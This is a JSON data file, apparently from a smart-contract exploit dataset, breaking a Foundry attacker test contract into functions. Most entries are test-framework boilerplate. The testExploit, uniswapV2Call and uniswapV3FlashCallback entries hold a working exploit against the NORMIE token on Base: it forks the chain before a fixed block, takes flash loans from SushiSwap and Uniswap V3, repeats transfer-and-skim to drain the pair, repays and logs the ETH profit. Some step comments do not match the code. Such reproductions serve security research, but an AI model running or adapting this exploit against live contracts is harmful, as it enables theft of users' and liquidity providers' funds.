[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"https://rpc.ankr.com/base\", 14_952_783 - 1);\n\n        uint256 ETH_balance_transfer_to_Zero_Address = address(this).balance - 3 ether;\n\n        payable(address(0)).call{value: ETH_balance_transfer_to_Zero_Address}(\"\");\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        console.log(\"---------------------------------------------------\");\n\n        console.log(\"ETH Balance before this attack: \", address(this).balance / 1e18);\n\n        console.log(\"---------------------------------------------------\");\n\n        // 1. Swap 2 ETH to NORMIE on SushiV2\n        address[] memory path1 = new address[](2);\n\n        path1[0] = WETH;\n        path1[1] = NORMIE;\n\n        Uni_Router_V2(SushiRouterv2).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 2 ether}(\n            0, path1, address(this), block.timestamp\n        );\n\n        uint256 NORMIE_amount_after_swapping = IERC20(NORMIE).balanceOf(address(this));\n\n        console.log(\"NORMIE amount after swapping\", NORMIE_amount_after_swapping / 10 ** 9);\n\n        // 2. Flash Loan from SushiV2 Pair\n        IUniswapV2Pair(SLP).swap(0, 5_000_000_000_000_000, address(this), hex\"01\");\n\n        // 4. Flash Loan from UniswapV3Pool\n\n        Uni_Pair_V3(UniswapV3Pool).flash(address(this), 0, 11_333_141_501_283_594, hex\"\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV2Call",
    "original_code": "    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {\n        // 3. Transfer all NORMIE to Pair\n\n        uint256 NORMIE_amount_after_flashLoan_from_SushiV2 = IERC20(NORMIE).balanceOf(address(this));\n\n        console.log(\"NORMIE amount after FlashLoan From SushiV2\", NORMIE_amount_after_flashLoan_from_SushiV2 / 10 ** 9);\n\n        IERC20(NORMIE).transfer(SLP, NORMIE_amount_after_flashLoan_from_SushiV2);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {\n        // 5. Approve NORMIE to SushiRouterv2\n\n        IERC20(NORMIE).approve(SushiRouterv2, type(uint256).max);\n\n        address[] memory path2 = new address[](2);\n\n        path2[0] = NORMIE;\n        path2[1] = WETH;\n\n        // 6. Swap 80% NORMIE to WETH on SushiV2\n\n        Uni_Router_V2(SushiRouterv2).swapExactTokensForETHSupportingFeeOnTransferTokens(\n            9_066_513_201_026_875, 0, path2, address(this), block.timestamp\n        );\n\n        // 7. Trasnfer remian NORMIE to slp\n\n        uint256 NORMIE_amount_after_swap_from_SushiV2 = IERC20(NORMIE).balanceOf(address(this));\n\n        console.log(\"NORMIE amount after swap From SushiV2\", NORMIE_amount_after_swap_from_SushiV2 / 10 ** 9);\n\n        IERC20(NORMIE).transfer(SLP, NORMIE_amount_after_swap_from_SushiV2);\n\n        // 8 . Looping tranfer and skim for 100 times\n\n        for (uint256 i; i < 50; ++i) {\n            IUniswapV2Pair(SLP).skim(address(this));\n\n            IERC20(NORMIE).transfer(SLP, NORMIE_amount_after_swap_from_SushiV2);\n        }\n\n        // 9. Skim but not tranfer again\n\n        IUniswapV2Pair(SLP).skim(address(this));\n\n        // 10. Swap 0.5 ETH to NORMIE on SushiV2\n\n        address[] memory path1 = new address[](2);\n\n        path1[0] = WETH;\n        path1[1] = NORMIE;\n\n        Uni_Router_V2(SushiRouterv2).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 2 ether}(\n            0, path1, address(this), block.timestamp\n        );\n\n        // 11. Repay FlashLoan to UniV3Pool\n\n        IERC20(NORMIE).transfer(UniswapV3Pool, 11_446_472_916_296_430);\n\n        // 12. Calcutelate Profit\n\n        console.log(\"---------------------------------------------------\");\n\n        console.log(\"ETH Profit after this attack: \", address(this).balance / 1e18);\n\n        console.log(\"---------------------------------------------------\");\n    }\n\n",
    "description": ""
  }
]